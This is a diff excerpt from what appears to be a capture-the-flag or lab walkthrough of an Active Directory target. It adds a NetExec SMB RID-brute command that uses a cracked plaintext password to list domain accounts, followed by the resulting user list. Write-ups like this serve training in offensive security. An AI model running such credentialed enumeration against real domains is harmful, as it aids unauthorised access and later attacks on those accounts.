@@ -344,9 +344,25 @@ The hash has cracked
 
 ## Dumping users
 ```python
-
+nxc smb sg-dc01.shadowgate.local -u mitch.r -p 'snitch1993' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
 ```
 
+```python
+cat users.txt                                                
+Administrator
+Guest
+krbtgt
+SG-DC01$
+daniel.r
+ryan.j
+svc_mssql
+mitch.r
+milo.w
+oscar.m
+bogdan.r
+```
+
+I now have all the users including machine accounts and service account
 ## Shares access
 ```python
 
